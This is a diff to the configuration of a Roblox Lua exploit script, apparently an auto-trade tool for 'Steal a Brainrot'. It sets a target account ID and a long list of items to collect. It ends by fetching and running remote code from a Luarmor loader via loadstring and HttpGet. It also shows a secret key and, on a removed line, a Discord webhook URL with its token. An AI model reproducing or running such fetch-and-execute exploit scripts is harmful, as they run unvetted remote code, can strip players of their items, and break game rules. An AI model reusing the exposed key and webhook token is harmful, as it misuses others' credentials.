@@ -1,8 +1,7 @@
 getgenv().SECRET_KEY = "mrr_4db801b8bea142ad888fe83c131b5282"
-getgenv().TARGET_ID = 10621618573
+getgenv().TARGET_ID = 4333524213
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484597961219637340/2Ka3UE3mY2ortzzxCNeXe2_A8p820V5YmmupjWUUoLIqRgNFM01lTNfxMFhnaz1Zx_CM"
 getgenv().TARGET_BRAINROTS = {
     ["W or L"] = true,
     ["La Taco Combinasion"] = true,
@@ -166,7 +165,6 @@ getgenv().TARGET_BRAINROTS = {
     ["Skibidi Toilet"] = true,
     ["Strawberry Elephant"] = true,
     ["La Vacca Saturno Saturnita"] = true,
-    ["Griffin"] = true,
     ["Nacho Spyder"] = true,
     ["Perrito Burrito"] = true,
     ["Quesadillo Vampiro"] = true,
@@ -199,7 +197,18 @@ getgenv().TARGET_BRAINROTS = {
     ["Antonio"] = true,
     ["Celestial Pegasus"] = true,
     ["Los Cupids"] = true,
-    ["Ventoliero Pavonero"] = true
+    ["Ventoliero Pavonero"] = true,
+    ["Griffin"] = true,
+    ["Signore Carapace"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Cigno Fulgoro"] = true,
+    ["DJ Panda"] = true,
+    ["Tacorillo Crocodillo"] = true,
+    ["Serafinna Medusella"] = true,
+    ["Paradiso Axolottino"] = true,
+    ["Fishboard"] = true,
+    ["Secret Lucky Block"] = true
 }
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
